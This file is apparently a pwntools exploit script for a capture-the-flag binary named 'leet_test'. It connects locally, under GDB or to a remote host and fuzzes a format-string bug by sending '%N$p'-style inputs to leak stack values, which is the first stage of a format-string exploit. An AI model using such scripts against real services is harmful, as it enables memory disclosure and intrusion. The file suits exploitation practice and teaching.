from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_payload, fmtstr_split

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def send_payload(payload):
    #log.info("payload = %s" % repr(payload))
    p.sendline(payload)
    p.recvuntil(b'Hello,')
    return p.recv()

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b *0x004013a7
continue
'''.format(**locals())
# piebase 0x40c0 # .bss section
# breakrva 0x1352 # read call (before BoF)


# Set up pwntools for the correct architecture
exe = './leet_test'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'INFO'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
p = start()

p.sendlineafter('Please enter your name: ', 'AAAAAAAAAAAA')


# Let's fuzz x values
for i in range(100):
    try:
        # p = process(exe)pyht
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        #p.sendline('%{}$llx'.format(i))
        p.sendlineafter('Please enter your name: ', '%{}$px'.format(i))
        # Receive the response
        p.recvuntil(b'Hello,')
        result = p.recvline()
        print(str(i) + ': ' + str(result))
        # p.close()
    except EOFError:
        pass


